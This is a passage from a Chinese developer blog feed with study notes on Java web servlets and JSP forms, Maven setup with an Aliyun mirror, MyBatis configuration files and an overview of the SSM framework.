class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">xname</span> <span class="operator">=</span> request.getParameter(<span class="string">"xname"</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">xgender</span> <span class="operator">=</span> request.getParameter(<span class="string">"xgender"</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">xage</span> <span class="operator">=</span> request.getParameter(<span class="string">"xage"</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">xaddress</span> <span class="operator">=</span> request.getParameter(<span class="string">"xaddress"</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">xemail</span> <span class="operator">=</span> request.getParameter(<span class="string">"xemail"</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">xid</span> <span class="operator">=</span> request.getParameter(<span class="string">"xid"</span>);</span><br><span class="line">          System.out.println(<span class="string">"测试获取FindID的表值"</span> + xaddress + xage + xname + xgender + xemail +xid);</span><br><span class="line">          <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> StuList.UpDate(xname, xgender, Integer.parseInt(xage), xaddress, xemail,Integer.parseInt(xid));</span><br><span class="line">          <span class="keyword">if</span> (i &gt; <span class="number">0</span>){</span><br><span class="line">              List&lt;Student&gt; students = StuList.StuShow();</span><br><span class="line">              session.setAttribute(<span class="string">"list"</span>,students);</span><br><span class="line">              response.sendRedirect(<span class="string">"home.jsp"</span>);</span><br><span class="line">          }<span class="keyword">else</span>{</span><br><span class="line">              response.sendRedirect(<span class="string">"index.jsp"</span>);</span><br><span class="line">          }</span><br></pre></td></tr></tbody></table></figure><p>如果有一些特殊的值需要传递但是又不能用a标签传递，那么可以用input标签将属性设定为隐藏后，一同提交到Java Service里</p><h2 id="Java-Service跳转JSP网页"><a href="#Java-Service跳转JSP网页" class="headerlink" title="Java Service跳转JSP网页"></a>Java Service跳转JSP网页</h2><p>通过使用response.sendRedirect进行跳转</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">response.sendRedirect(<span class="string">"home.jsp"</span>);</span><br></pre></td></tr></tbody></table></figure><h2 id="Java-Service如何传值给Jsp网页"><a href="#Java-Service如何传值给Jsp网页" class="headerlink" title="Java Service如何传值给Jsp网页"></a>Java Service如何传值给Jsp网页</h2><p>通过保存会话到Session，然后在JSP网页中调用会话，进行传递</p><p>可以选择压缩成集合进行传递，也可以单个变量，使用集合后可以在Jsp里用JSTL核心标签库的&lt;c:forEach&gt;标签进行循环遍历</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">"第三个flag:"</span> + flag);</span><br><span class="line">          <span class="type">String</span> <span class="variable">xname</span> <span class="operator">=</span> request.getParameter(<span class="string">"xname"</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">xgender</span> <span class="operator">=</span> request.getParameter(<span class="string">"xgender"</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">xage</span> <span class="operator">=</span> request.getParameter(<span class="string">"xage"</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">xaddress</span> <span class="operator">=</span> request.getParameter(<span class="string">"xaddress"</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">xemail</span> <span class="operator">=</span> request.getParameter(<span class="string">"xemail"</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">xid</span> <span class="operator">=</span> request.getParameter(<span class="string">"xid"</span>);</span><br><span class="line">          System.out.println(<span class="string">"测试获取FindID的表值"</span> + xaddress + xage + xname + xgender + xemail +xid);</span><br><span class="line">          <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> StuList.UpDate(xname, xgender, Integer.parseInt(xage), xaddress, xemail,Integer.parseInt(xid));</span><br><span class="line">          <span class="keyword">if</span> (i &gt; <span class="number">0</span>){</span><br><span class="line">              List&lt;Student&gt; students = StuList.StuShow();</span><br><span class="line">              session.setAttribute(<span class="string">"list"</span>,students);</span><br><span class="line">              response.sendRedirect(<span class="string">"home.jsp"</span>);</span><br><span class="line">          }<span class="keyword">else</span>{</span><br><span class="line">              response.sendRedirect(<span class="string">"index.jsp"</span>);</span><br><span class="line">          }</span><br></pre></td></tr></tbody></table></figure><p>Jsp页面</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"Stu"</span>&gt;</span><br><span class="line">    &lt;c:forEach items=<span class="string">"${liststu}"</span> <span class="keyword">var</span>=<span class="string">"stu"</span> varStatus=<span class="string">"status"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"xid"</span> value=<span class="string">"${stu.sid}"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"flag"</span> value=<span class="string">"upDate"</span>&gt;</span><br><span class="line">        &lt;p&gt;名字: &lt;input type=<span class="string">"text"</span> value=<span class="string">"${stu.sname}"</span> name=<span class="string">"xname"</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;性别: &lt;input type=<span class="string">"text"</span> value=<span class="string">"${stu.sgender}"</span> name=<span class="string">"xgender"</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;年龄: &lt;input type=<span class="string">"text"</span> value=<span class="string">"${stu.sage}"</span> name=<span class="string">"xage"</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;地址: &lt;input type=<span class="string">"text"</span> value=<span class="string">"${stu.saddress}"</span> name=<span class="string">"xaddress"</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;邮箱: &lt;input type=<span class="string">"text"</span> value=<span class="string">"${stu.semail}"</span> name=<span class="string">"xemail"</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> value=<span class="string">"更改"</span>&gt;</span><br><span class="line">        &lt;button&gt;&lt;a href=<span class="string">"Stu?flag=Del&amp;xid=${stu.sid}"</span>&gt;删除&lt;/a&gt;&lt;/button&gt;</span><br><span class="line">    &lt;/c:forEach&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></tbody></table></figure><p>在这其中，通过使用${stu.sname}可以调用Java代码，用来插入需要的信息</p><h1 id="12-Ajax和jQuery"><a href="#12-Ajax和jQuery" class="headerlink" title="12.Ajax和jQuery"></a>12.Ajax和jQuery</h1><p>下午编写笔记</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部署Maven</title>
      <link href="/NANABLOG/2023/10/03/Maven/"/>
      <url>/NANABLOG/2023/10/03/Maven/</url>
      
        <content type="html"><![CDATA[<h2 id="Maven配置"><a href="#Maven配置" class="headerlink" title="Maven配置"></a>Maven配置</h2><h4 id="1-下载包"><a href="#1-下载包" class="headerlink" title="1.下载包"></a>1.下载包</h4><p>下载 apache-maven-3.8.1-bin.zip 解压</p><h4 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2.配置环境变量"></a>2.配置环境变量</h4><h4 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="3.修改配置文件"></a>3.修改配置文件</h4><p>在conf-settings.xml里配置你的仓库路径</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/SETTINGS/1.2.0"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/SETTINGS/1.2.0 http://maven.apache.org/xsd/settings-1.2.0.xsd"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- localRepository</span></span><br><span class="line"><span class="comment">   | The path to the local repository maven will use to store artifacts.</span></span><br><span class="line"><span class="comment">   |</span></span><br><span class="line"><span class="comment">   | Default: ${user.home}/.m2/repository</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>D:\maven\apache-maven-3.8.1\repository<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span>  替换成你要配置的路径</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>tip:注意，repository文件夹需要自己创建</p><p>然后增加一个阿里云下载</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>maven-default-http-blocker<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>external:http:*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>Pseudo repository to mirror external repositories initially using HTTP.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://0.0.0.0/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">blocked</span>&gt;</span>true<span class="tag">&lt;/<span class="name">blocked</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/repositories/central/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="4-IDEA绑定Maven"><a href="#4-IDEA绑定Maven" class="headerlink" title="4.IDEA绑定Maven"></a>4.IDEA绑定Maven</h4><p>在创建Maven框架项目的时候会弹出路径选择，选择你<strong>环境配置</strong>的那个Maven</p><h4 id="5-IDEA选包"><a href="#5-IDEA选包" class="headerlink" title="5.IDEA选包"></a>5.IDEA选包</h4><p>选择你要创建的包项目 wepapp or String boot</p><h4 id="6-Artifact-Coordinates修改"><a href="#6-Artifact-Coordinates修改" class="headerlink" title="6.Artifact Coordinates修改"></a>6.Artifact Coordinates修改</h4><p>GroupId:根目录</p><p>ArtifactId:每次创建的名称</p><p>version:版本号</p><h4 id="7-在Maven项目的详细设置窗口增加一个Properties"><a href="#7-在Maven项目的详细设置窗口增加一个Properties" class="headerlink" title="7.在Maven项目的详细设置窗口增加一个Properties"></a>7.在Maven项目的详细设置窗口增加一个Properties</h4><p>groupId:<strong>archetypeCatalog</strong></p><p>com.<strong>bqdn:internal</strong></p><h4 id="8-完成"><a href="#8-完成" class="headerlink" title="8.完成"></a>8.完成</h4><p>等待下载 如有报错 点击刷新</p><h4 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h4><p><code>pom.xml</code>是Maven项目的核心配置文件，用于描述项目的构建信息、依赖管理、插件配置等。下面是一个简单的表格，介绍了一些常见的<code>pom.xml</code>节点及其描述：</p><table><thead><tr><th align="center">节点名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>project</code></td><td align="center">根节点，用于定义Maven项目的全局配置。</td></tr><tr><td align="center"><code>modelVersion</code></td><td align="center">项目模型的版本号。</td></tr><tr><td align="center"><code>groupId</code></td><td align="center">项目所属的组ID。</td></tr><tr><td align="center"><code>artifactId</code></td><td align="center">项目ID。</td></tr><tr><td align="center"><code>version</code></td><td align="center">项目版本号。</td></tr><tr><td align="center"><code>packaging</code></td><td align="center">项目的打包方式，如<code>jar</code>、<code>war</code>等。</td></tr><tr><td align="center"><code>name</code></td><td align="center">项目的名称。</td></tr><tr><td align="center"><code>url</code></td><td align="center">项目的URL地址。</td></tr><tr><td align="center"><code>properties</code></td><td align="center">项目属性配置，可以在这里定义自定义属性。</td></tr><tr><td align="center"><code>dependencies</code></td><td align="center">项目的依赖列表，用于描述项目所依赖的库及其版本号。</td></tr><tr><td align="center"><code>dependencyManagement</code></td><td align="center">依赖管理节点，用于集中配置项目中所有依赖的版本号和传递性依赖关系。</td></tr><tr><td align="center"><code>build</code></td><td align="center">构建配置节点，用于定义项目的构建过程、插件配置等。</td></tr><tr><td align="center"><code>sourceDirectory</code></td><td align="center">项目的源代码目录。</td></tr><tr><td align="center"><code>outputDirectory</code></td><td align="center">编译输出目录。</td></tr><tr><td align="center"><code>testSourceDirectory</code></td><td align="center">测试源代码目录。</td></tr><tr><td align="center"><code>testOutputDirectory</code></td><td align="center">测试编译输出目录。</td></tr><tr><td align="center"><code>plugins</code></td><td align="center">插件列表，用于定义项目构建过程中使用的插件及其配置。</td></tr><tr><td align="center"><code>pluginManagement</code></td><td align="center">插件管理节点，用于集中配置项目中所有插件的版本号和配置。</td></tr><tr><td align="center"><code>profiles</code></td><td align="center">配置文件节点，用于定义不同环境下的项目配置，如开发、测试、生产等。</td></tr><tr><td align="center"><code>activeProfiles</code></td><td align="center">激活的配置文件列表，用于指定在构建过程中要使用的配置文件。</td></tr></tbody></table><h4 id="路径解析"><a href="#路径解析" class="headerlink" title="路径解析"></a>路径解析</h4><p>静态文件放在<strong>webapp</strong>下方</p><p>在src创建Java文件夹 用来<strong>实际</strong>运行JAVA WEB 项目</p><p>在src创建Test文件夹 用来<strong>测试</strong>运行JAVA 项目</p><p>在pom.xml导包 无需在webapp下方创建lib文件夹 因为之前设置的阿里云导包目录和Url路径，Maven会自动在阿里云下载相关包</p><p>在src创建 <strong>配置</strong>文件夹</p>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部署MyBatis框架</title>
      <link href="/NANABLOG/2022/10/03/MyBatis%E6%A1%86%E6%9E%B6/"/>
      <url>/NANABLOG/2022/10/03/MyBatis%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="MyBatis框架笔记"><a href="#MyBatis框架笔记" class="headerlink" title="MyBatis框架笔记"></a>MyBatis框架笔记</h1><h2 id="核心要素"><a href="#核心要素" class="headerlink" title="核心要素"></a>核心要素</h2><h3 id="1-XML配置文件"><a href="#1-XML配置文件" class="headerlink" title="1. XML配置文件"></a>1. XML配置文件</h3><p>MyBatis的配置文件，通常包括数据源、映射文件的路径等信息。</p><h3 id="2-映射文件"><a href="#2-映射文件" class="headerlink" title="2. 映射文件"></a>2. 映射文件</h3><p>映射文件定义了数据库表与Java对象的映射关系，包括SQL语句、参数映射等。</p><h3 id="3-SqlSessionFactory"><a href="#3-SqlSessionFactory" class="headerlink" title="3. SqlSessionFactory"></a>3. SqlSessionFactory</h3><p>SqlSessionFactory是MyBatis的核心接口，用于创建SqlSession实例，通常在应用程序中只需要一个实例。</p><h3 id="4-SqlSession"><a href="#4-SqlSession" class="headerlink" title="4. SqlSession"></a>4. SqlSession</h3><p>SqlSession是数据库会话，用于执行SQL语句，提交事务等操作。它类似于JDBC中的Connection。</p><h3 id="5-Mapper接口"><a href="#5-Mapper接口" class="headerlink" title="5. Mapper接口"></a>5. Mapper接口</h3><p>Mapper接口定义了操作数据库的方法，通常与映射文件中的SQL语句相对应。</p><h2 id="常用的语句"><a href="#常用的语句" class="headerlink" title="常用的语句"></a>常用的语句</h2><p>以下是一些MyBatis中常用的SQL语句：</p><table><thead><tr><th>类型</th><th>语句示例</th><th>描述</th></tr></thead><tbody><tr><td>查询</td><td><code>SELECT * FROM users</code></td><td>查询数据库中的所有用户</td></tr><tr><td>插入</td><td><code>INSERT INTO users VALUES (...)</code></td><td>向数据库中插入新的用户</td></tr><tr><td>更新</td><td><code>UPDATE users SET ... WHERE ...</code></td><td>更新数据库中符合条件的用户信息</td></tr><tr><td>删除</td><td><code>DELETE FROM users WHERE ...</code></td><td>删除数据库中符合条件的用户</td></tr></tbody></table><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>MyBatis的实现原理基于Java反射和动态SQL的概念。它通过XML配置文件中的映射关系将Java对象与数据库表关联，然后动态生成SQL语句，执行数据库操作。MyBatis还提供了缓存机制，可以提高查询性能。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h4 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h4><p>需要导入log4j-1.2.17.jar</p><p>mybatis-3.5.1.jar</p><p>mysql-connector-java-8.0.19.jar</p><h4 id="声明文件"><a href="#声明文件" class="headerlink" title="声明文件"></a>声明文件</h4><h5 id="database-properties"><a href="#database-properties" class="headerlink" title="database.properties"></a>database.properties</h5><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line">driver=com.mysql.cj.jdbc.Driver</span><br><span class="line">url=jdbc:mysql://127.0.0.1:3306/cvs_db?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false&amp;serverTimezone=UTC&amp;zeroDateTimeBehavior=convertToNull</span><br><span class="line">user=root</span><br><span class="line">password=123</span><br></pre></td></tr></tbody></table></figure><h5 id="log4j-properties"><a href="#log4j-properties" class="headerlink" title="log4j.properties"></a>log4j.properties</h5><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">log4j.rootLogger=DEBUG,CONSOLE,file</span><br><span class="line">#log4j.rootLogger=ERROR,ROLLING_FILE</span><br><span class="line">log4j.logger.cn.cvs.dao=debug</span><br><span class="line">log4j.logger.com.ibatis=debug </span><br><span class="line">log4j.logger.com.ibatis.common.jdbc.SimpleDataSource=debug </span><br><span class="line">log4j.logger.com.ibatis.common.jdbc.ScriptRunner=debug </span><br><span class="line">log4j.logger.com.ibatis.sqlmap.engine.impl.SqlMapClientDelegate=debug </span><br><span class="line">log4j.logger.java.sql.Connection=debug </span><br><span class="line">log4j.logger.java.sql.Statement=debug </span><br><span class="line">log4j.logger.java.sql.PreparedStatement=debug </span><br><span class="line">log4j.logger.java.sql.ResultSet=debug </span><br><span class="line">log4j.logger.org.tuckey.web.filters.urlrewrite.UrlRewriteFilter=debug</span><br><span class="line"></span><br><span class="line">######################################################################################</span><br><span class="line"># Console Appender  \u65E5\u5FD7\u5728\u63A7\u5236\u8F93\u51FA\u914D\u7F6E</span><br><span class="line">######################################################################################</span><br><span class="line">log4j.appender.CONSOLE=org.apache.log4j.ConsoleAppender</span><br><span class="line">log4j.appender.Threshold=error</span><br><span class="line">log4j.appender.CONSOLE.Target=System.out</span><br><span class="line">log4j.appender.CONSOLE.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.CONSOLE.layout.ConversionPattern= [%p] %d %c - %m%n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">######################################################################################</span><br><span class="line"># DailyRolling File  \u6BCF\u5929\u4EA7\u751F\u4E00\u4E2A\u65E5\u5FD7\u6587\u4EF6\uFF0C\u6587\u4EF6\u540D\u683C\u5F0F:log2009-09-11</span><br><span class="line">######################################################################################</span><br><span class="line">log4j.appender.file=org.apache.log4j.DailyRollingFileAppender</span><br><span class="line">log4j.appender.file.DatePattern=yyyy-MM-dd</span><br><span class="line">log4j.appender.file.File=log.log</span><br><span class="line">log4j.appender.file.Append=true</span><br><span class="line">log4j.appender.file.Threshold=error</span><br><span class="line">log4j.appender.file.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.file.layout.ConversionPattern=%d{yyyy-M-d HH:mm:ss}%x[%5p](%F:%L) %m%n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log4j.logger.com.opensymphony.xwork2=error  </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h5 id="mybatis-config-xml"><a href="#mybatis-config-xml" class="headerlink" title="mybatis-config.xml"></a>mybatis-config.xml</h5><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span> <span class="keyword">PUBLIC</span> <span class="string">"-//mybatis.org//DTD Config 3.0//EN"</span> <span class="string">"http://mybatis.org/dtd/mybatis-3-config.dtd"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   引入数据库参数--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">"database.properties"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    设置运行行为--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">"logImpl"</span> <span class="attr">value</span>=<span class="string">"LOG4J"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    配置MyBatis框架的运行环境--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">"JDBC"</span>&gt;</span><span class="tag">&lt;/<span class="name">transactionManager</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">"POOLED"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                导入数据库连接所需要的信息--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                使用的JDBC--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driver"</span> <span class="attr">value</span>=<span class="string">"${driver}"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                连接的路径--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"${url}"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                数据库账号 这里要注意 所有的name 都是不可变的--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"${user}"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                数据库密码--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"${password}"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    配置sql映射文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        第一个 Dao--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">"com/company/dao/UserMapper.xml"</span>&gt;</span><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        第二个 Dao--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSM开发框架部署</title>
      <link href="/NANABLOG/2022/10/03/SSM%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6/"/>
      <url>/NANABLOG/2022/10/03/SSM%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<p>SSM是一个常用于Java Web应用程序开发的开发框架，它由Spring、Spring MVC和MyBatis三个不同的框架组成，每个框架负责不同的任务，以提高应用程序的开发效率和可维护性。</p><p>以下是SSM开发框架的简要介绍和原理：</p><ol><li><strong>Spring</strong>：<ul><li><strong>介绍</strong>：Spring是一个轻量级的Java框架，用于管理应用程序中的组件（如对象、服务、事务等）。</li><li><strong>原理</strong>：Spring使用控制反转（IoC）和依赖注入（DI）原则，通过容器管理应用程序的对象。它将应用程序中的各个组件配置为Spring Bean，并将它们注入到需要它们的地方。这种松散耦合的设计有助于测试和维护。</li></ul></li><li><strong>Spring MVC</strong>：<ul><li><strong>介绍</strong>：Spring MVC是Spring框架的一部分，用于构建Web应用程序的MVC模式。</li><li><strong>原理</strong>：Spring MVC采用前端控制器模式，一个DispatcherServlet负责接收所有HTTP请求。请求被分派到相应的控制器，控制器处理请求并返回相应的视图。视图通常是JSP、HTML或JSON等。这种分层结构有助于将应用程序的不同部分分离开来，提高可维护性。</li></ul></li><li><strong>MyBatis</strong>：<ul><li><strong>介绍</strong>：MyBatis是一个用于持久化数据库数据的框架，它提供了一种将Java对象映射到数据库表的方式。</li><li><strong>原理</strong>：MyBatis使用XML或注解来配置SQL查询语句，并提供了一个SQLSessionFactory来管理数据库连接。开发者可以编写SQL语句，将它们映射到Java对象，然后使用MyBatis执行这些SQL查询。MyBatis还支持事务管理和缓存，以提高数据库访问性能。</li></ul></li></ol><p><strong>整合原理</strong>：</p><ul><li>这三个框架通常一起使用，Spring作为应用程序的核心容器，负责管理Bean，包括MyBatis的Mapper接口和Spring MVC的控制器。</li><li>Spring MVC用于处理Web请求，控制器从请求中获取数据，然后调用服务层，服务层再调用MyBatis进行数据库操作。</li><li>MyBatis用于数据库访问，它可以与Spring集成以受益于Spring的事务管理和依赖注入功能。</li></ul><p>通过整合这三个框架，开发者可以构建功能强大的Java Web应用程序，具有良好的分层结构和高度的可维护性。此外，整合后的应用程序也易于测试和扩展。</p><p><strong>Spring MVC常用注解:</strong></p><p>Spring MVC是一个基于Java的Web框架，它使用MVC（Model-View-Controller）模式来帮助开发人员创建Web应用程序。在Spring MVC中，常用的注解包括以下几种：</p><ol><li>@Controller：用于标记一个类作为Spring MVC控制器，将处理来自客户端的请求并返回一个响应。</li><li>@RequestMapping：用于将一个特定的URL映射到控制器中的一个方法上，以便处理该URL的请求。@RequestMapping注解可以用于类级别和方法级别。</li><li>@GetMapping、@PostMapping、@PutMapping、@DeleteMapping、@PatchMapping：这些注解是@RequestMapping的快捷方式，用于映射HTTP GET、POST、PUT、DELETE、PATCH请求到控制器中的方法。</li><li>@PathVariable：用于从URL中获取路径变量，并将其作为参数传递给控制器方法。</li><li>@RequestParam：用于从请求参数中获取值，并将其作为参数传递给控制器方法。</li><li>@RequestBody：用于从请求体中获取JSON或XML数据，并将其作为参数传递给控制器方法。</li><li>@ResponseBody：用于将控制器方法的返回值直接写入HTTP响应体中，而不是将其转发给视图解析器。</li><li>@ControllerAdvice：用于将全局异常处理方法绑定到控制器上，以便统一处理应用程序中发生的异常。</li><li>@RestController：用于将多个控制器方法映射到RESTful API中，以便更简洁地编写基于REST的Web应用程序。</li><li>@RequestParamMap：用于从请求参数中获取键值对，并将其作为Map传递给控制器方法。</li></ol><p>除了上述常用的注解之外，Spring MVC还提供了其他一些注解，如@ExceptionHandler、@InitBinder等，用于处理异常和自定义数据绑定等操作。</p><h3 id="部署步骤"><a href="#部署步骤" class="headerlink" title="部署步骤"></a>部署步骤</h3><h5 id="配置applicationContext-xml"><a href="#配置applicationContext-xml" class="headerlink" title="配置applicationContext.xml"></a>配置applicationContext.xml</h5><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"org.apache.commons.dbcp.BasicDataSource"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        